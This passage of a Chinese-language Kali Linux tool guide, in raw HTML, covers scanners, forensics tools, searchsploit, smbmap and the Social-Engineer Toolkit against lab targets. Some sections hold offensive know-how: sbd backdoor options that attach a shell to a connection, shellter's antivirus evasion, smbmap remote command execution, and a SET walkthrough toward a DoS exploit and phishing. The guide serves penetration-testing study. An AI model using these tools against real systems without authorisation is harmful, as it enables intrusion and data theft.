title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#参数-o表示将其扫描结果输出到某个目录内,该目录必须为空目录</span><br><span class="hljs-comment">#如果目录不存在系统则会创建目录,然后开始扫描</span><br>1,root@kali:~<span class="hljs-comment"># skipfish -o test1 http://192.168.128.129</span><br><span class="hljs-comment">#在扫描中输入空格可以查看详细信息,再次敲空格则返回扫描状态</span><br><span class="hljs-comment">#Issues found : 41 info, 1 warn, 12 low, 4 medium, 0 high impact</span><br><span class="hljs-comment">#在这条提示信息下可以得知该Web服务器的高危漏洞,低微漏洞等个数</span><br><span class="hljs-comment">#扫描结束后,系统会提示将扫描结果保存在该所指定的目录下的某个文件内</span><br>如:[+] Report saved to <span class="hljs-string">&#x27;test1/index.html&#x27;</span> [0x733a6edf].<br></code></pre></td></tr></table></figure><h3 id="示例-7"><a href="#示例-7" class="headerlink" title="示例:"></a>示例:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#扫描多个目标,该命令表示扫描url.txt文件中的url,</span><br><span class="hljs-comment">#并且将扫描结果存放在test3文件内</span><br>root@kali:~<span class="hljs-comment"># skipfish -o test3  @url.txt</span><br><br><span class="hljs-comment">#使用skipfish中的字典枚举发现目标服务器隐藏文件</span><br><span class="hljs-comment">#skipfish的字典默认以wl结尾</span><br>root@kali:~<span class="hljs-comment"># dpkg -L skipfish | grep wl #查找其字典文件</span><br>/usr/share/skipfish/dictionaries/medium.wl <span class="hljs-comment">#中型字典</span><br>/usr/share/skipfish/dictionaries/minimal.wl <span class="hljs-comment">#小型字典</span><br>/usr/share/skipfish/dictionaries/extensions-only.wl <span class="hljs-comment">#扩展字典</span><br>/usr/share/skipfish/dictionaries/complete.wl <span class="hljs-comment">#完整型字典</span><br><br><span class="hljs-comment">#参数-o表示将扫描的内容存储到该参数后面的文件内</span><br><span class="hljs-comment">#参数-I表示匹配URL中某个字符串进行扫描,在本例中即扫描/dvwa目录</span><br><span class="hljs-comment">#参数-S表示指定文件列表,后面跟字典表示用字典去扫描目标的隐藏文件</span><br>root@kali:~<span class="hljs-comment"># skipfish -o test6 -I /dvwa -S /usr/share/skipfish/dictionaries/minimal.wl  http://192.168.128.129/dvwa</span><br><br><span class="hljs-comment">#参数-X:表示不检查包含某个字符串的URL</span><br><span class="hljs-comment">#参数-K:表示不对制定的参数进行Fuzz测试</span><br><span class="hljs-comment">#参数-D:表示跨站点爬另一个域,</span><br>如下面命令表示去扫描192.168.128.129网站的内容,如果有xxx.com这个域的链接,那么也会去扫xxx.com这个域的信息<br>root@kali:~<span class="hljs-comment"># skipfish -o test7  -D xxx.com -I /dvwa -S /usr/share/skipfish/dictionaries/minimal.wl  http://192.168.128.129/dvwa</span><br><br>参数-l:每秒最大的请求数下面的例子表示每秒最大请求20次,实际上比20次多一些<br>root@kali:~<span class="hljs-comment"># skipfish -o test8  -l 20  -S /usr/share/skipfish/dictionaries/minimal.wl  http://192.168.128.129/dvwa </span><br><br>参数-m:表示每个ip最大并发连接数<br>root@kali:~<span class="hljs-comment"># skipfish -o test9  -m 20  -S /usr/share/skipfish/dictionaries/minimal.wl  http://192.168.128.129/dvwa </span><br><br>可以在其配置文件内将需要的参数配置好,然后输命令的时候加上参数--config指定配置文件即可<br><br>**Skipfish身份认证**<br>参数-A 用户名:密码:表示使用特定的http验证<br>root@kali:~<span class="hljs-comment">#  skipfish -o test11 -I /dvwa -A admin:password  http://192.168.128.129/dvwa</span><br><br><span class="hljs-comment">#参数-C后面接cookie</span><br><span class="hljs-comment">#参数-X表示不扫描制定的字符串的内容,此例表示不扫描logout.php页面(一旦扫描logout.php便会退出,故不扫描)</span><br>root@kali:~<span class="hljs-comment">#  skipfish -o test10 -I /dvwa -X logout.php -C &quot;PHPSESSID=6f155b6b28fa5b88721ad9e5cbd3f08&quot; -C &quot;security=low&quot;  http://192.168.128.129/dvwa </span><br><br><span class="hljs-comment">#通过表单提交用户名密码</span><br><span class="hljs-comment">#参数--auth-form表示登陆账户名密码的界面</span><br><span class="hljs-comment">#参数--auth-user 后面指定用户名</span><br><span class="hljs-comment">#参数--auth-pass 后面指定密码</span><br><span class="hljs-comment">#参数--auth-verify-url 后面指定登陆成功后的界面(即判断是否登陆成功)</span><br>root@kali:~<span class="hljs-comment"># skipfish -o test12 --auth-form http://192.168.128.129/dvwa/login.php --auth-user admin --auth-pass password --auth-verify-url http://192.168.128.129/dvwa/index.php -I /dvwa   http://192.168.128.129/dvwa</span><br><br></code></pre></td></tr></table></figure><p>-I 只检查包含′string′的 URL</p><p>skipfish -o test -I &#x2F;aiyou&#x2F; <a href="https://link.zhihu.com/?target=http://192.168.1.104">http://192.168.1.104</a></p><p>-X 不检查包含′string′的URL #例如：aiyou</p><p>skipfish -o test -X &#x2F;aiyou&#x2F; <a href="https://link.zhihu.com/?target=http://192.168.1.104">http://192.168.1.104</a></p><p>-S 用字典去爬网站</p><p>skipfish -o test -S complet.wl <a href="https://link.zhihu.com/?target=http://192.168.1.104">http://192.168.1.104</a></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204142240915.jpeg" alt="img"></p><p>-W 将目标网站特有的特征漏洞代码存到文件</p><p>1、扫描整个站点，将结果保存在test文件夹中</p><p>skipfish -o test -S somplet.wl -W abc.wl <a href="https://link.zhihu.com/?target=http://192.168.1.104">http://192.168.1.104</a></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204142240908.jpeg" alt="img"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204142240950.jpeg" alt="img"></p><p>2、基于http身份认证</p><p>skipfish -A admin:password -o test <a href="https://link.zhihu.com/?target=http://192.168.1.104/dvwa/">http://192.168.1.104/dvwa/</a></p><p>3、基于Cookies身份认证</p><p>skipfish -C “name&#x3D;val” -o test <a href="https://link.zhihu.com/?target=http://192.168.1.104/dvwa/">http://192.168.1.104/dvwa/</a></p><p>如果有多个cookies值，多一个cookies就多一个 -C “name&#x3D;val”</p><h2 id="sslh"><a href="#sslh" class="headerlink" title="sslh"></a>sslh</h2><h3 id="描述：-68"><a href="#描述：-68" class="headerlink" title="描述："></a>描述：</h3><p><a href="https://www.rutschle.net/tech/sslh/README.html">sslh</a>是一个ssl&#x2F;ssh多路复用软件。</p><h3 id="参数：-53"><a href="#参数：-53" class="headerlink" title="参数："></a>参数：</h3><p>将<code>sslh-fork.service</code>或<code>sslh-select.service</code><a href="https://wiki.archlinux.org/title/Systemd_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#%E4%BD%BF%E7%94%A8%E5%8D%95%E5%85%83">设置为开机自启动</a> 。</p><p><code>sslh-fork</code>为每一个新连接创建一个新的进程。<code>sslh-fork</code>经过广泛测试，具有良好的可靠性，但会榨干许多处理器的性能。 如果在一个“小环境”下使用<code>sslh</code>（只有几个ssh连接的低流量https服务器），使用<code>sslh-fork</code>非常合适。</p><p><code>sslh-select</code>只使用一个线程，在同一时间监听所有连接。<code>sslh-select</code>功能较新且测试不足，但每个连接最多只使用16字节。当然，如果<code>sslh-select</code>停止工作，所有连接都会中止，因此你不能对其远程升级。 如果在一个“中型环境”下使用<code>sslh</code>（上千个ssh连接和上千个ssl连接），<code>sslh-select</code>更合适。</p><p>如果要在非常大的环境下使用<code>sslh</code>（上万个连接），可能需要某些应用了libevent或类似技术的“概念版”软件（译者注：vapourware，又称“雾件”，指发布后从未真正发行的软件，类似于“概念车”）。</p><h2 id="samdump2"><a href="#samdump2" class="headerlink" title="samdump2"></a>samdump2</h2><h3 id="描述：-69"><a href="#描述：-69" class="headerlink" title="描述："></a>描述：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204142244727.png" alt="image-20220414224442591"></p><h3 id="参数：-54"><a href="#参数：-54" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown">-d<br><span class="hljs-code">启用调试</span><br><span class="hljs-code"></span><br>-h<br><span class="hljs-code">显示这个帮助</span><br><span class="hljs-code"></span><br>-o file<br><span class="hljs-code">将输出写入文件</span><br><span class="hljs-code"></span><br></code></pre></td></tr></table></figure><h2 id="sbd"><a href="#sbd" class="headerlink" title="sbd"></a>sbd</h2><h3 id="描述：-70"><a href="#描述：-70" class="headerlink" title="描述："></a>描述：</h3><p>sbd 它是Linux和Windows系统的安全后门</p><h3 id="参数：-55"><a href="#参数：-55" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">-l<br>监听传入的连接<br><br>-p n<br>选择要侦听的端口，或选择要从其连接的源端口<br><br>-a address<br>选择一个地址以收听或连接<br><br>-e prog<br>连接后要执行的程序（例如-e cmd.exe或-e bash）<br><br>-r n<br>无限重生/重新连接，在两次连接尝试之间暂停n秒。 -r0可用于在断开连接后重新监听（就像常规守护程序一样）<br><br>-c on|off<br>开/关加密。 指定是否要使用内置的AES-CBC-128 + HMAC-SHA1加密实现（由Christophe Devine-http://www.cr0.net:8040/）或默认为：-c on<br><br>-k secret<br>覆盖用于加密的默认短语（秘密必须在客户端和服务器之间共享）<br><br>-q<br>安静，安静，不打印任何内容（覆盖-v）<br><br>-v<br>是详细的<br><br>-n<br>切换仅数字的IP地址（不进行DNS解析）。 如果您两次指定-n，则原始状态将处于活动状态（即-n就像打开/关闭开关一样）<br><br>-m<br>打开/关闭监视（监听）（仅与-e选项一起使用）。 还可以通过指定-vv（两次-v）来打开监听<br><br>-P prefix<br>在所有出站数据中添加前缀（+硬编码分隔符）。此选项仅对“聊天模式”中的sbd有用（以昵称发送的前缀行）<br><br>-H on|off<br>用硬编码（彩色）转义序列突出显示传入的数据（例如，聊天）。 默认为：-H关闭<br><br>-V<br>打印版本标语并退出（在错误报告中包括该输出，并将错误报告发送至michel.blomgren@tigerteam.se）类似于Unix的OS特<br></code></pre></td></tr></table></figure><h2 id="scalpel"><a href="#scalpel" class="headerlink" title="scalpel"></a>scalpel</h2><h3 id="描述：-71"><a href="#描述：-71" class="headerlink" title="描述："></a>描述：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204142250366.png" alt="image-20220414225054187"></p><h3 id="参数：-56"><a href="#参数：-56" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">-b<br>即使在文件类型的最大刻录尺寸内未找到定义的页脚，也可以刻录文件[最旧的0.69兼容模式]<br><br>-c file<br>选择要使用的配置文件。 如果省略此选项，则使用当前目录中的“ scalpel.conf”。 默认配置文件“ scalpel.conf”中描述了配置文件的格式。 有关更多信息，请参见下面的“配置文件”部分。<br><br>-d<br>生成页眉/页脚数据库； 将绕过某些优化并发现所有页脚，因此会降低性能。 不会影响刻录的文件集。 **实验**<br><br>-m<br>生成/更新刻录覆盖度框图文件。 文件中的第一个32位unsigned int标识块大小。 此后，块图文件中的每个32位无符号int条目对应于映像文件中的一个块。 每个条目计算包含此块的刻录文件数量。 需要更多的内存和磁盘。** EXPERIMENTAL **<br><br>-h<br>显示帮助屏幕并退出。<br><br>-i file<br>文件用作要检查的输入文件的列表。 指定文件中的每一行都应包含一个文件名。<br><br>-o directory<br>恢复的文件将写入目录目录。Scalpel要求此目录为空或不存在。 如有必要，将创建目录。<br><br>-O<br>不要按类型组织刻录文件。 默认设置是将刻录文件组织到子目录中，以简化预览大量刻录文件的过程。<br><br>-p<br>执行图像文件预览； 审核日志指示哪些文件将被刻录，但实际上没有文件被刻录。<br><br>-q clustersize<br>仅在标头与簇对齐时才刻录。<br><br>-r<br>仅查找重叠的页眉/页脚中的第一个[最旧的0.69兼容模式]<br><br>-s number<br>开始搜索文件标题和页脚之前，请跳过每个输入文件中的数字字节。<br><br>-t<br>设置覆盖框图的目录。 **实验**<br><br>-u<br>刻录时使用刻录覆盖图。 仅刻录在块图中的条目为0的图像部分。这些区域被视为连续区域。 **实验**<br><br>-V<br>显示版权信息并退出<br></code></pre></td></tr></table></figure><h2 id="scouge-ntfs"><a href="#scouge-ntfs" class="headerlink" title="scouge-ntfs"></a>scouge-ntfs</h2><h3 id="描述：-72"><a href="#描述：-72" class="headerlink" title="描述："></a>描述：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204142257547.png" alt="image-20220414225722402"></p><h3 id="参数：-57"><a href="#参数：-57" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">选项如下：<br>-c<br>群集大小（以扇区为单位）。 如果未指定，则使用默认值8。<br><br>-l<br>列出驱动器的分区信息。 仅当给定驱动器的分区表完好无损时，这才起作用。<br><br>-m<br>恢复数据时，这指定了MFT从分区开始的位置（以扇区为单位）。 如果未指定，则无法使用任何目录信息，也就是说，所有获救的文件都将写入同一目录<br><br>-o<br>放置已救援文件的目录。如果未指定，则文件将放置在当前目录中。<br><br>-s<br>在磁盘上搜索分区信息。 （尚未实现）。<br><br>disk<br>用于访问包含要从中抢救文件的NTFS分区的磁盘的原始设备。 例如：<span class="hljs-string">&#x27;/ dev / hdc&#x27;</span><br><br>start<br>NTFS分区的开始（以扇区为单位）。<br><br>end<br>NTFS分区的末尾（以扇区为单位）<br><br></code></pre></td></tr></table></figure><h2 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h2><h3 id="描述：-73"><a href="#描述：-73" class="headerlink" title="描述："></a>描述：</h3><p>Exploit-db是Kali linux 官方团队维护的一个安全项目，存储了大量的漏洞利用程序，是公认的世界上最大的搜集漏洞的数据库。它的在线版本是<a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a> ，离线版本是： <a href="https://github.com/offensive-security/exploit-database">https://github.com/offensive-security/exploit-database</a> 。而searchsploit可以利用exploit-db提供的数据库进行离线搜索，加上参数又可以到exploit-db.com上进行在线搜索。可以帮助安全研究者和渗透测试工程师更好的进行安全测试工作。Kali Linux或者其他的渗透测试系统默认安装了searchsploit,因此本文不再讲其安装过程。使用方法是使用终端，键入其语法。</p><h3 id="参数：-58"><a href="#参数：-58" class="headerlink" title="参数："></a>参数：</h3><p>searchsploit [options] term1 [term2] … [termN]</p><p>searchsploit [选项] 关键字1 [关键字2] … [关键字N]</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">-c, --<span class="hljs-keyword">case</span>[Term]执行区分大小写的搜索，缺省是对大小写不敏感。<br><br>-e, --exact [Term]对exploit标题执行EXACT匹配（默认为AND）<br><br>-h, --<span class="hljs-built_in">help</span>在屏幕上显示帮助<br><br>-j, --json[Term]以JSON格式显示结果<br><br>-m, --mirror [EDB-ID]将一个漏洞利用镜像（副本）到当前工作目录，后面跟漏洞ID号<br><br>-o, --overflow [Term]Exploit标题被允许溢出其列<br><br>-p, --path[EDB-ID]显示漏洞利用的完整路径（如果可能，还将路径复制到剪贴板），后面跟漏洞ID号<br><br>-t, --title[Term]仅仅搜索漏洞标题（默认是标题和文件的路径）<br><br>-u, --update检查并安装任何exploitdb软件包更新（deb或git）<br><br>-w, --www [Term]显示Exploit-DB.com的URL而不是本地路径（在线搜索）<br><br>-x, --examine[EDB-ID]使用$ PAGER检查（副本）漏洞利用<br><br>-v --verbose 显示更多的输出信息<br><br>--colour在搜索结果中禁用颜色突出显示.<br><br>--<span class="hljs-built_in">id</span>显示EDB-ID值而不是本地路径<br><br>--nmap[file.xml]使用服务版本检查Nmap XML输出中的所有结果（例如：nmap -sV -oX file.xml）<br></code></pre></td></tr></table></figure><h3 id="示例-8"><a href="#示例-8" class="headerlink" title="示例:"></a>示例:</h3><p><strong>漏洞更新</strong></p><p>searchsploit -u</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204142300679.png" alt="image-20220414230003508"></p><p><strong>基本搜索</strong></p><p>基本搜索会同时匹配标题和路径中的内容</p><p>如:searchsploit smb windows remote<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204142303568.png" alt="image-20220414230303361"></p><p><strong>标题搜索</strong></p><p>标题搜索只匹配标题,不会对路径中的关键词进行匹配</p><p>如:searchsploit -t smb windows remote</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204142304200.png" alt="image-20220414230457966"></p><p><strong>联网搜索</strong></p><p>searchsploit EternalBlue</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204142305491.png" alt="image-20220414230543336"></p><p><strong>复制到文件夹</strong></p><p>不建议在本地的漏洞数据库中修改exp,建议使用-m</p><p>参数复制那些有用的到当前的工作目录</p><p>如:searchsploit -m 42031.py</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204142306477.png" alt="image-20220414230612328"></p><p><strong>复制到剪贴板</strong></p><p>-p参数可以获取更多关于该漏洞的信息,以及将完整的路径复制到剪贴板上(如果可能的话)</p><p>如:searchsploit -p 42031.py</p><p><strong>删除不想要的结果</strong></p><p>使用–exclude&#x3D;选项删除不想要的结果</p><p>如:searchsploit smb windows remote –exclude&#x3D;”(POC)|txt”</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204142307046.png" alt="image-20220414230709775"><strong>利用管道输出(删除不想要的结果的另一种方法)</strong></p><p>如:searchsploit smb windows remote | grep rb只显示rb文件</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204142307457.png" alt="image-20220414230741306"></p><h2 id="shellter"><a href="#shellter" class="headerlink" title="shellter"></a>shellter</h2><h3 id="描述：-74"><a href="#描述：-74" class="headerlink" title="描述："></a>描述：</h3><p>Shellter 是将代码注入到正常的PE文件当中，将有效载荷重新编码（此处为 shellcode）以绕过防病毒 (AV) 软件，而且必须是32位的程序，应用程序的 PE（可移植<a href="https://so.csdn.net/so/search?q=%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6&spm=1001.2101.3001.7020">可执行文件</a>）文件格式的动态感染器。</p><h3 id="参数：-59"><a href="#参数：-59" class="headerlink" title="参数："></a>参数：</h3><p><a href="https://blog.csdn.net/weixin_44420143/article/details/118599206">https://blog.csdn.net/weixin_44420143/article/details/118599206</a></p><h2 id="smbmap"><a href="#smbmap" class="headerlink" title="smbmap"></a>smbmap</h2><h3 id="描述：-75"><a href="#描述：-75" class="headerlink" title="描述："></a>描述：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204142331602.png" alt="image-20220414233132459"></p><h3 id="参数：-60"><a href="#参数：-60" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">主要参数：<br>-H HOST<br>主机IP<br><br>--host-file FILE<br>包含主机列表的文件<br><br>-u USERNAME<br>用户名，如果省略，则假定为空会话<br><br>-p PASSWORD<br>密码或NTLM哈希<br><br>-s SHARE<br>指定份额（默认为C $），例如“ C $”<br><br>-d DOMAIN<br>域名（默认为WORKGROUP）<br><br>-P PORT<br>SMB端口（默认为445）<br><br>命令执行：<br>在指定主机上执行命令的选项<br>-x COMMAND<br>执行命令ex。 <span class="hljs-string">&#x27;ipconfig /all&#x27;</span><br><br>文件系统搜索:<br>用于搜索/枚举指定主机的文件系统的选项<br>-L<br>列出指定主机上的所有驱动器<br><br>-R [PATH]<br>递归列出目录和文件（没有共享\路径列出所有共享），例如。 C $ \ Finance<br><br>-r [PATH]<br>列出目录的内容，默认为列出所有共享的根目录，例如。 -r<span class="hljs-string">&#x27;C $ \ Documents and Settings \ Administrator \ Documents&#x27;</span><br><br>-A PATTERN<br>定义一个文件名模式（正则表达式），该文件名根据匹配项自动下载文件（要求-R或-r），不区分大小写，例如<span class="hljs-string">&#x27;（web | g</span><br></code></pre></td></tr></table></figure><h2 id="snmp-check"><a href="#snmp-check" class="headerlink" title="snmp-check"></a>snmp-check</h2><h3 id="描述：-76"><a href="#描述：-76" class="headerlink" title="描述："></a>描述：</h3><p>工具可以完成snmp检测</p><p>什么是是那么snmp呢？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">简单网络管理协议（SNMP） 是专门设计用于在 IP 网络管理网络节点（服务器、工作站、路由器、交换机及HUBS等）的一种标准协议，它是一种应用层协议。<br>SNMP的前身是简单网关监控协议（SGMP），用来对通信线路进行管理。随后，人们对SGMP进行了很大的修改，特别是加入了符合Internet定义的SMI和MIB，改进后的协议就是著名的SNMP。基于TCP/IP的SNMP网络管理框架是工业上的现行标准，由3个主要部分组成，分别是管理信息结构SMI（Structure ofManagement Information）、管理信息库MIB和管理协议SNMP。<br>https://baike.baidu.com/item/%E7%AE%80%E5%8D%95%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86%E5%8D%8F%E8%AE%AE/2986113?fromtitle=SNMP&amp;fromid=133378&amp;fr=aladdin<br></code></pre></td></tr></table></figure><h3 id="参数：-61"><a href="#参数：-61" class="headerlink" title="参数："></a>参数：</h3><p>snmp-check 【选项】 &lt;目标ip&gt;</p><p>-t是指定请求超时的参数，不指定该参数则默认为5s。</p><p>snmp-check &lt;目标ip&gt;</p><p>snmp-check -t 10 &lt;目标ip&gt;</p><p>这样就能够获取你想要的信息啦。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151257120.png" alt="image-20220415125758817"></p><h2 id="social-engineering-toolkit"><a href="#social-engineering-toolkit" class="headerlink" title="social engineering toolkit"></a>social engineering toolkit</h2><h3 id="描述：-77"><a href="#描述：-77" class="headerlink" title="描述："></a>描述：</h3><p>社会工程学工具集,里面包含了许多社会工程学攻击的工具</p><h3 id="参数：-62"><a href="#参数：-62" class="headerlink" title="参数："></a>参数：</h3><p>缩写 setoolkit</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151308170.png" alt="image-20220415130821646"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151308952.png" alt="image-20220415130853813"></p><p>4选项是更新升级set，我们这里不做演示<br>5选项是更新set的设置，这里也不做演示<br>6选项主要是一些帮助菜单，说明等，这里也不做演示</p><p>我们主要演示1，2，3</p><p>先来看看2<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151310585.png" alt="image-20220415131005399"></p><p>这是渗透测试，主要用于快速攻击<br>因为我们提到过，set主要用途是用于社会工程学的钓鱼攻击，钓鱼是需要耐心的，可能需要等待很久，相比之下，渗透测试更加迅速。<br>所以在实践钓鱼之前，我们先来看看渗透测试</p><p>上图中可以看到有很多攻击向量可以选择，我们这边输入2，选择自定义的exp<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151311306.png" alt="image-20220415131137164"></p><p>可以看到神器08-067也在<br>我们就不同它了，换一个，比如说可以dos的释放后重利用UAF的exp<br>选择4并回车<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151312105.png" alt="image-20220415131159961"></p><p>接下来输入我们要攻击的靶机的ip就可以开始攻击了</p><p>第三方模块的学习。接下来再介绍下启动之后的3选项</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151313679.png" alt="image-20220415131304530"></p><p>选用这个谷歌模块，这个模块是基于google analytics进行攻击的<br>Google analytics用于评估广告的投资回报率，并对您的 Flash、视频以及社交网络网站和应用进行跟踪，大多数有投放广告的站点上都有它的存在，可见攻击范围还是很广的</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151314769.png" alt="image-20220415131427589"></p><p>模式选择自动模式<br>输入automatic<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204151315412.png" alt="image-20220415131516266"></p><p>接下来输入目标站点<br>就可以开始自动分析、攻击的流程了</p><p>社会工程学钓鱼攻击学习。<br>最后，我们实践一个set最典型的用法—钓鱼攻击，使用的是启动之后的1选项（即社会工程学攻击）</p><p>选择1，并回车，表示社会工程学攻击</p><p><img 